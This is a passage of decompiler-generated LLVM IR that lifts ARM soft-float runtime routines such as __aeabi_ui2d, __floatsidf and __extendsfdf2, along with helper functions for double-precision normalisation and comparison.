  %v1_17bb8 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_17bb0 = icmp ugt i32 %v0_17c00, 65535
  br i1 %v2_17bb0, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_17bb4 = and i32 %v0_17c00, 32768
  %v3_17bb4 = icmp eq i32 %v2_17bb4, 0
  %v4_17bb4 = udiv i32 %v0_17c00, 65536
  br i1 %v3_17bb4, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_17bb8 = add nsw i32 %v1_17bb8, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_17bc4 = phi i32 [ %v1_17bb8, %.thread ], [ %v1_17bb8, %bb39 ], [ %v2_17bb8, %bb40 ]
  %v1_17bc0 = phi i32 [ %v0_17c00, %.thread ], [ %v4_17bb4, %bb39 ], [ %v4_17bb4, %bb40 ]
  %v2_17bbc = icmp ugt i32 %v1_17bc0, 255
  br i1 %v2_17bbc, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_17bc0 = and i32 %v1_17bc0, 128
  %v3_17bc0 = icmp eq i32 %v2_17bc0, 0
  %v4_17bc0 = udiv i32 %v1_17bc0, 256
  br i1 %v3_17bc0, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_17bc4 = add nsw i32 %v1_17bc4, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_17bd0 = phi i32 [ %v1_17bc4, %.thread3 ], [ %v1_17bc4, %bb41 ], [ %v2_17bc4, %bb42 ]
  %v1_17bcc = phi i32 [ %v1_17bc0, %.thread3 ], [ %v4_17bc0, %bb41 ], [ %v4_17bc0, %bb42 ]
  %v2_17bc8 = icmp ugt i32 %v1_17bcc, 15
  br i1 %v2_17bc8, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_17bcc = and i32 %v1_17bcc, 8
  %v3_17bcc = icmp eq i32 %v2_17bcc, 0
  %v4_17bcc = udiv i32 %v1_17bcc, 16
  br i1 %v3_17bcc, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_17bd0 = add nsw i32 %v1_17bd0, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_17bd8 = phi i32 [ %v1_17bd0, %.thread4 ], [ %v1_17bd0, %bb43 ], [ %v2_17bd0, %bb44 ]
  %v1_17be0 = phi i32 [ %v1_17bcc, %.thread4 ], [ %v4_17bcc, %bb43 ], [ %v4_17bcc, %bb44 ]
  %v2_17bd4 = icmp ugt i32 %v1_17be0, 3
  br i1 %v2_17bd4, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_17bd8 = add i32 %v1_17bd8, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_17bdc = udiv i32 %v1_17be0, 2
  %v6_17bdc = sub i32 %v1_17bd8, %v5_17bdc
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_17be0 = phi i32 [ %v6_17bdc, %.thread6 ], [ %v2_17bd8, %bb45 ]
  %v4_17be0 = udiv i32 %v1_17be0, 8
  %v5_17be0 = sub i32 %v0_17be0, %v4_17be0
  %v2_17be4 = add i32 %v5_17be0, -32
  %v4_17be4 = sub i32 31, %v5_17be0
  %v5_17be4 = and i32 %v4_17be4, %v5_17be0
  %v8_17be4 = icmp eq i32 %v5_17be0, 32
  %v6_17be8 = icmp slt i32 %v5_17be0, 32
  br i1 %v6_17be8, label %dec_label_pc_17bec, label %dec_label_pc_17c0c

dec_label_pc_17bec:                               ; preds = %bb46
  %v2_17bec = add i32 %v5_17be0, -20
  %v7_17bf0 = icmp sgt i32 %v2_17be4, -12
  br i1 %v7_17bf0, label %dec_label_pc_17bf4, label %dec_label_pc_17c08

dec_label_pc_17bf4:                               ; preds = %dec_label_pc_17bec
  %v1_17bf8 = sub i32 32, %v5_17be0
  %v6_17bfc = shl i32 %v0_17c00, %v5_17be0
  store i32 %v6_17bfc, i32* @r0, align 4
  %v6_17c00 = lshr i32 %v0_17c00, %v1_17bf8
  store i32 %v6_17c00, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_17c08:                               ; preds = %dec_label_pc_17bec
  %v8_17bec = icmp eq i32 %v2_17bec, 0
  %v4_17bec = add i32 %v5_17be0, 2147483616
  %v5_17bec = and i32 %v2_17bec, %v4_17bec
  br label %dec_label_pc_17c0c

dec_label_pc_17c0c:                               ; preds = %bb46, %dec_label_pc_17c08
  %v1_17c18.in = phi i32 [ %v2_17be4, %bb46 ], [ %v2_17bec, %dec_label_pc_17c08 ]
  %v6_17c18 = phi i32 [ %v2_17be4, %bb46 ], [ %v5_17be0, %dec_label_pc_17c08 ]
  %v2_17c18.in = phi i32 [ %v5_17be4, %bb46 ], [ %v5_17bec, %dec_label_pc_17c08 ]
  %v0_17c18 = phi i1 [ %v8_17be4, %bb46 ], [ %v8_17bec, %dec_label_pc_17c08 ]
  %v1_17c18 = icmp slt i32 %v1_17c18.in, 0
  %v2_17c18 = icmp slt i32 %v2_17c18.in, 0
  %v3_17c0c = xor i1 %v2_17c18, %v1_17c18
  %v4_17c0c = or i1 %v0_17c18, %v3_17c0c
  br i1 %v4_17c0c, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_17c0c
  %v6_17c0c = sub i32 32, %v6_17c18
  store i32 %v6_17c0c, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_17c0c, %bb47
  %v6_17c10 = shl i32 %v0_17c00, %v6_17c18
  store i32 %v6_17c10, i32* %r1.global-to-local, align 4
  br i1 %v4_17c0c, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_17c14 = load i32, i32* @r0, align 4
  %v7_17c14 = load i32, i32* @ip, align 4
  %v12_17c14 = lshr i32 %v6_17c14, %v7_17c14
  %v13_17c14 = or i32 %v12_17c14, %v6_17c10
  store i32 %v13_17c14, i32* %r1.global-to-local, align 4
  %v11_17c18 = shl i32 %v6_17c14, %v6_17c18
  store i32 %v11_17c18, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_17bf4, %bb49
  %v6_17c20 = phi i32 [ %v6_17c00, %dec_label_pc_17bf4 ], [ %v13_17c14, %bb49 ], [ %v6_17c10, %bb48 ]
  %v0_17c1c = load i32, i32* @r4, align 4
  %v2_17c1c = sub i32 %v0_17c1c, %v5_17be0
  store i32 %v2_17c1c, i32* %r4.global-to-local, align 4
  %v4_17c1c = xor i32 %v0_17c1c, %v5_17be0
  %v5_17c1c = xor i32 %v2_17c1c, %v0_17c1c
  %v6_17c1c = and i32 %v5_17c1c, %v4_17c1c
  %v7_17c1c = icmp slt i32 %v6_17c1c, 0
  %v8_17c1c = icmp slt i32 %v2_17c1c, 0
  %v5_17c20 = icmp slt i32 %v0_17c1c, %v5_17be0
  br i1 %v5_17c20, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_17c20 = mul i32 %v2_17c1c, 1048576
  %v11_17c20 = add i32 %v10_17c20, %v6_17c20
  %v7_17c24 = load i32, i32* @r5, align 4
  %v8_17c24 = or i32 %v7_17c24, %v11_17c20
  store i32 %v8_17c24, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_17c2c = xor i1 %v8_17c1c, %v7_17c1c
  %v4_17c2c = xor i1 %v3_17c2c, true
  call void @__pseudo_cond_branch(i1 %v4_17c2c, i32 %tmp33)
  %v0_17c30 = load i32, i32* %r4.global-to-local, align 4
  %v2_17c34 = sub i32 -32, %v0_17c30
  store i32 %v2_17c34, i32* %r4.global-to-local, align 4
  %v6_17c38 = icmp sgt i32 %v0_17c30, -32
  br i1 %v6_17c38, label %dec_label_pc_17c3c, label %dec_label_pc_17c7c

dec_label_pc_17c3c:                               ; preds = %.thread8
  %v1_17c3c = add i32 %v2_17c34, 12
  store i32 %v1_17c3c, i32* %r4.global-to-local, align 4
  %v8_17c40 = icmp sgt i32 %v1_17c3c, 0
  br i1 %v8_17c40, label %dec_label_pc_17c60, label %dec_label_pc_17c44

dec_label_pc_17c44:                               ; preds = %dec_label_pc_17c3c
  %v1_17c44 = add i32 %v2_17c34, 32
  %v1_17c48 = sub i32 0, %v2_17c34
  %v0_17c4c = load i32, i32* @r0, align 4
  %v6_17c4c = lshr i32 %v0_17c4c, %v1_17c44
  %v1_17c50 = load i32, i32* %r1.global-to-local, align 4
  %v7_17c50 = shl i32 %v1_17c50, %v1_17c48
  %v8_17c50 = or i32 %v7_17c50, %v6_17c4c
  %v0_17c54 = load i32, i32* @r5, align 4
  %v7_17c54 = lshr i32 %v1_17c50, %v1_17c44
  %v8_17c54 = or i32 %v0_17c54, %v7_17c54
  store i32 %v8_17c54, i32* %r1.global-to-local, align 4
  %v2_17c58 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_17c58, i32* %r4.global-to-local, align 4
  ret i32 %v8_17c50

dec_label_pc_17c60:                               ; preds = %dec_label_pc_17c3c
  %v1_17c60 = sub i32 0, %v2_17c34
  %v1_17c64 = add i32 %v2_17c34, 32
  %v0_17c68 = load i32, i32* @r0, align 4
  %v6_17c68 = lshr i32 %v0_17c68, %v1_17c64
  %v1_17c6c = load i32, i32* %r1.global-to-local, align 4
  %v7_17c6c = shl i32 %v1_17c6c, %v1_17c60
  %v8_17c6c = or i32 %v7_17c6c, %v6_17c68
  %v0_17c70 = load i32, i32* @r5, align 4
  store i32 %v0_17c70, i32* %r1.global-to-local, align 4
  %v2_17c74 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_17c74, i32* %r4.global-to-local, align 4
  ret i32 %v8_17c6c

dec_label_pc_17c7c:                               ; preds = %.thread8
  %v0_17c7c = load i32, i32* %r1.global-to-local, align 4
  %v6_17c7c = lshr i32 %v0_17c7c, %v2_17c34
  %v0_17c80 = load i32, i32* @r5, align 4
  store i32 %v0_17c80, i32* %r1.global-to-local, align 4
  %v2_17c84 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_17c84, i32* %r4.global-to-local, align 4
  ret i32 %v6_17c7c

; uselistorder directives
  uselistorder i32 %v2_17c34, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_17c1c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17c1c, { 2, 0, 1, 3 }
  uselistorder i32 %v6_17c10, { 1, 0, 2 }
  uselistorder i32 %v2_17be4, { 1, 0, 2 }
  uselistorder i32 %v5_17be0, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_17bcc, { 1, 0 }
  uselistorder i32 %v1_17bcc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17bc0, { 1, 0 }
  uselistorder i32 %v1_17bc0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17bb4, { 1, 0 }
  uselistorder i32 %v0_17c00, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 8, 1, 6, 2, 7, 3, 4, 5, 9, 10 }
  uselistorder i32 -12, { 4, 1, 0, 5, 15, 16, 6, 18, 19, 7, 20, 21, 17, 14, 13, 12, 11, 10, 22, 23, 24, 25, 9, 26, 2, 8, 3, 27, 28, 29 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -4, { 12, 0, 1, 49, 13, 69, 14, 22, 73, 74, 75, 8, 23, 24, 25, 76, 77, 78, 9, 26, 27, 28, 79, 80, 81, 10, 29, 30, 82, 21, 20, 83, 84, 85, 19, 18, 17, 16, 31, 32, 33, 34, 35, 7, 36, 5, 37, 6, 86, 15, 38, 46, 47, 48, 39, 40, 63, 65, 66, 11, 67, 68, 64, 41, 62, 2, 42, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 43, 70, 71, 72, 44, 4, 3, 45 }
  uselistorder i32 -8, { 4, 5, 0, 33, 12, 13, 14, 15, 16, 17, 11, 10, 3, 9, 8, 7, 6, 18, 19, 20, 21, 22, 2, 37, 23, 24, 25, 26, 27, 34, 35, 28, 36, 32, 29, 30, 31, 1, 38, 39 }
  uselistorder i32 255, { 7, 8, 4, 11, 12, 3, 5, 6, 10, 0, 1, 2, 9 }
  uselistorder i32 -16, { 2, 23, 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 0, 22 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_17c0c, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_17c8c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_17c8c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_17c8c = load i32, i32* @r4, align 4
  %v2_17c8c = icmp eq i32 %v0_17c8c, 0
  %v1_17c90 = xor i32 %arg3, 1048576
  store i32 %v1_17c90, i32* @r3, align 4
  br i1 %v2_17c8c, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_17c8c
  %v1_17c94 = load i32, i32* @r1, align 4
  %v2_17c94 = xor i32 %v1_17c94, 1048576
  store i32 %v2_17c94, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_17c8c
  %v1_17c9c = load i32, i32* @r5, align 4
  %v2_17c9c = add i32 %v1_17c9c, -1
  store i32 %v2_17c9c, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_17ca0 = call i32 @function_17ae4()
  store i32 %v0_17ca0, i32* %r0.global-to-local, align 4
  %v0_17ca4 = load i32, i32* @r4, align 4
  %v0_17ca4.off = add i32 %v0_17ca4, 4194303
  %tmp = icmp ult i32 %v0_17ca4.off, 2097152
  %v1_17d34 = load i32, i32* @r5, align 4
  %v1_17d34.off = add i32 %v1_17d34, 4194303
  %tmp44 = icmp ult i32 %v1_17d34.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_17cb0

dec_label_pc_17cb0:                               ; preds = %bb30
  %v4_17cb0 = icmp eq i32 %v1_17d34, %v0_17ca4
  br i1 %v4_17cb0, label %bb31, label %dec_label_pc_17cbc

bb31:                                             ; preds = %dec_label_pc_17cb0
  %v2_17cb4 = load i32, i32* @r2, align 4
  %v5_17cb4 = icmp eq i32 %v2_17cb4, %v0_17ca0
  br i1 %v5_17cb4, label %dec_label_pc_17cd0, label %dec_label_pc_17cbc

dec_label_pc_17cbc:                               ; preds = %dec_label_pc_17cb0, %bb31
  %v2_17cbc = or i32 %v0_17ca4, %v0_17ca0
  %v4_17cbc = icmp eq i32 %v2_17cbc, 0
  br i1 %v4_17cbc, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_17cbc
  %v1_17cc4 = load i32, i32* @r2, align 4
  store i32 %v1_17cc4, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_17cbc, %bb32
  %v1_17ccc = phi i32 [ %v0_17ca0, %dec_label_pc_17cbc ], [ %v1_17cc4, %bb32 ]
  ret i32 %v1_17ccc

dec_label_pc_17cd0:                               ; preds = %bb31
  %v0_17cd0 = load i32, i32* @r1, align 4
  %v1_17cd0 = load i32, i32* @r3, align 4
  %v4_17cd0 = icmp eq i32 %v1_17cd0, %v0_17cd0
  br i1 %v4_17cd0, label %dec_label_pc_17cd0..thread8_crit_edge, label %bb33

dec_label_pc_17cd0..thread8_crit_edge:            ; preds = %dec_label_pc_17cd0
  %v0_17ce0.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_17cd0
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17cd0..thread8_crit_edge, %bb33
  %v0_17ce0 = phi i32 [ %v0_17ce0.pre, %dec_label_pc_17cd0..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_17ce0 = xor i1 %v4_17cd0, true
  call void @__pseudo_cond_branch(i1 %v2_17ce0, i32 %v0_17ce0)
  %v0_17ce4 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_17ce4, 2097152
  br i1 %tmp45, label %dec_label_pc_17cec, label %dec_label_pc_17d00

dec_label_pc_17cec:                               ; preds = %.thread8
  %v0_17cec = load i32, i32* %r0.global-to-local, align 4
  %v1_17cec = icmp slt i32 %v0_17cec, 0
  %v2_17cec = mul i32 %v0_17cec, 2
  store i32 %v2_17cec, i32* %r0.global-to-local, align 4
  %v0_17cf0 = load i32, i32* @r1, align 4
  %v3_17cf0 = mul i32 %v0_17cf0, 2
  %v4_17cf0 = zext i1 %v1_17cec to i32
  %v5_17cf0 = or i32 %v3_17cf0, %v4_17cf0
  %v9_17cf0 = icmp ule i32 %v5_17cf0, %v0_17cf0
  %v10_17cf0 = icmp ult i32 %v3_17cf0, %v0_17cf0
  %v11_17cf0 = select i1 %v1_17cec, i1 %v9_17cf0, i1 %v10_17cf0
  br i1 %v11_17cf0, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_17cec
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_17cec, %bb34
  ret i32 %v2_17cec

dec_label_pc_17d00:                               ; preds = %.thread8
  %v2_17d00 = icmp ugt i32 %v0_17ce4, -4194305
  br i1 %v2_17d00, label %dec_label_pc_17d00..thread9_crit_edge, label %bb36

dec_label_pc_17d00..thread9_crit_edge:            ; preds = %dec_label_pc_17d00
  %v0_17d0c.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_17d00
  %v1_17d04 = load i32, i32* @r1, align 4
  %v2_17d04 = add i32 %v1_17d04, 1048576
  store i32 %v2_17d04, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17d00..thread9_crit_edge, %bb36
  %v0_17d0c = phi i32 [ %v0_17d0c.pre, %dec_label_pc_17d00..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_17d0c = xor i1 %v2_17d00, true
  call void @__pseudo_cond_branch(i1 %v2_17d0c, i32 %v0_17d0c)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_17d40.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_17d40.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_17d2c = load i32, i32* @r3, align 4
  %v1_17d30 = load i32, i32* @r2, align 4
  store i32 %v1_17d30, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_17d4023 = phi i32 [ %v1_17d40.pre, %.thread14 ], [ %v1_17d2c, %bb37 ]
  %v1_17d3c = phi i32 [ %v0_17ca0, %.thread14 ], [ %v1_17d30, %bb37 ]
  store i32 %v1_17d3c, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_17d4c = phi i32 [ %v1_17d4023, %bb38 ], [ %v1_17d40.pre, %.thread11 ]
  %v1_17d54 = phi i32 [ %v1_17d3c, %bb38 ], [ %v0_17ca0, %.thread11 ]
  %v4_17d40 = mul i32 %v1_17d4c, 4096
  %v5_17d40 = or i32 %v4_17d40, %v1_17d54
  %v7_17d40 = icmp eq i32 %v5_17d40, 0
  br i1 %v7_17d40, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_17d44 = load i32, i32* @r2, align 4
  %v2_17d44 = load i32, i32* @r3, align 4
  %v5_17d44 = mul i32 %v2_17d44, 4096
  %v6_17d44 = or i32 %v5_17d44, %v1_17d44
  %v8_17d44 = icmp eq i32 %v6_17d44, 0
  br i1 %v8_17d44, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_17d48 = icmp eq i32 %v2_17d44, %v1_17d4c
  br i1 %v5_17d48, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_17d54

; uselistorder directives
  uselistorder i32 %v1_17d40.pre, { 0, 2, 1 }
  uselistorder i32 %v0_17cf0, { 1, 2, 0 }
  uselistorder i32 %v2_17cec, { 1, 0 }
  uselistorder i1 %v1_17cec, { 1, 0 }
  uselistorder i32 %v0_17ce4, { 1, 0 }
  uselistorder i1 %v4_17cd0, { 1, 0 }
  uselistorder i32 %v0_17ca4, { 2, 0, 1 }
  uselistorder i32 %v0_17ca0, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_17cbc, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_17d58 = icmp eq i32 %arg1, 0
  br i1 %v2_17d58, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_17d60 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_17d58, i32 %v0_17d60)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_17d78 = call i32 @function_17b98()
  ret i32 %v0_17d78

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_17d7c = icmp eq i32 %arg1, 0
  br i1 %v2_17d7c, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_17d84 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_17d7c, i32 %v0_17d84)
  store i32 1074, i32* @r4, align 4
  %v1_17d94 = and i32 %arg1, -2147483648
  store i32 %v1_17d94, i32* @r5, align 4
  %v2_17d94 = icmp eq i32 %v1_17d94, 0
  br i1 %v2_17d94, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_17d98 = sub i32 0, %arg1
  store i32 %v2_17d98, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_17da0 = call i32 @function_17b98()
  ret i32 %v0_17da0

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_17da4 = mul i32 %arg1, 2
  store i32 %v2_17da4, i32* %r2.global-to-local, align 4
  %v4_17da4 = icmp eq i32 %v2_17da4, 0
  %v1_17da8 = and i32 %v2_17da4, 4
  %v2_17da8 = icmp ne i32 %v1_17da8, 0
  %v3_17da8 = sdiv i32 %v2_17da4, 8
  %v3_17dac = zext i1 %v2_17da8 to i32
  %v6_17dac = zext i32 %v3_17da8 to i64
  %v7_17dac = sub nsw i32 33, %v3_17da8
  %v8_17dac = zext i32 %v7_17dac to i64
  %v9_17dac = shl i64 %v6_17dac, %v8_17dac
  %v10_17dac = sub nsw i32 32, %v3_17da8
  %v11_17dac = shl i32 %v3_17dac, %v10_17dac
  %v12_17dac = zext i32 %v11_17dac to i64
  %v14_17dac = or i64 %v12_17dac, %v9_17dac
  %v15_17dac = trunc i64 %v14_17dac to i32
  store i32 %v15_17dac, i32* %r1.global-to-local, align 4
  %v3_17db0 = mul i32 %arg1, 536870912
  store i32 %v3_17db0, i32* @r0, align 4
  br i1 %v4_17da4, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_17db4 = and i32 %v2_17da4, -16777216
  store i32 %v2_17db4, i32* @r3, align 4
  %v4_17db4 = icmp eq i32 %v2_17db4, 0
  br i1 %v4_17db4, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_17db8 = icmp ugt i32 %v2_17da4, -16777217
  br i1 %v4_17db8, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_17dbc = xor i32 %v15_17dac, 939524096
  store i32 %v2_17dbc, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_17dc0 = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_17dc0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_17dc0, i32 %v0_17dc0)
  %v0_17dc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_17dc4 = icmp eq i32 %v0_17dc4, 0
  br i1 %v2_17dc4, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_17dc8 = load i32, i32* @r3, align 4
  %v4_17dc8 = icmp eq i32 %v1_17dc8, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_17dcc = phi i1 [ true, %.thread1 ], [ %v4_17dc8, %bb9 ]
  %v0_17dcc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_17dcc, i32 %v0_17dcc)
  store i32 896, i32* @r4, align 4
  %v0_17dd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17dd8 = and i32 %v0_17dd8, -2147483648
  store i32 %v1_17dd8, i32* @r5, align 4
  %tmp = bitcast i32 %v0_17dd8 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_17ddc = bitcast float %tmp11 to i32
  store i32 %v1_17ddc, i32* @r1, align 4
  %v0_17de0 = call i32 @function_17b98()
  ret i32 %v0_17de0

; uselistorder directives
  uselistorder i32 %v3_17da8, { 1, 2, 0 }
  uselistorder i32 %v2_17da4, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_17b98, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_17de4 = or i32 %arg2, %arg1
  %v4_17de4 = icmp eq i32 %v2_17de4, 0
  %v0_17de8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_17de4, i32 %v0_17de8)
  store i32 0, i32* @r5, align 4
  %v0_17df4 = call i32 @function_17e14()
  ret i32 %v0_17df4
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_17df8 = or i32 %arg2, %arg1
  %v4_17df8 = icmp eq i32 %v2_17df8, 0
  %v0_17dfc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_17df8, i32 %v0_17dfc)
  %v1_17e08 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_17e08, i32 ptrtoint (i32* @global_var_17e14.957 to i32))
  %v1_17e0c = sub i32 0, %arg1
  ret i32 %v1_17e0c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_17e14() local_unnamed_addr {
dec_label_pc_17e14:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_17e1c = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_17e1c, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_17b38.955 to i32))
  %tmp6 = icmp ult i32 %v0_17e1c, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_17e14
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_17e14, %bb
  %v1_17e34 = phi i32 [ 3, %dec_label_pc_17e14 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_17e1c, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_17e34 = add nuw nsw i32 %v1_17e34, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_17e38 = phi i32 [ %v1_17e34, %bb3 ], [ %v2_17e34, %bb4 ]
  %not. = icmp slt i32 %v0_17e1c, 0
  %v4_17e38 = zext i1 %not. to i32
  %v5_17e38 = add nsw i32 %v0_17e38, %v4_17e38
  %v1_17e3c = sub nsw i32 32, %v5_17e38
  %v0_17e40 = load i32, i32* @r0, align 4
  %v6_17e40 = shl i32 %v0_17e40, %v1_17e3c
  store i32 %v6_17e40, i32* @ip, align 4
  %v6_17e44 = lshr i32 %v0_17e40, %v5_17e38
  %v1_17e48 = load i32, i32* @r1, align 4
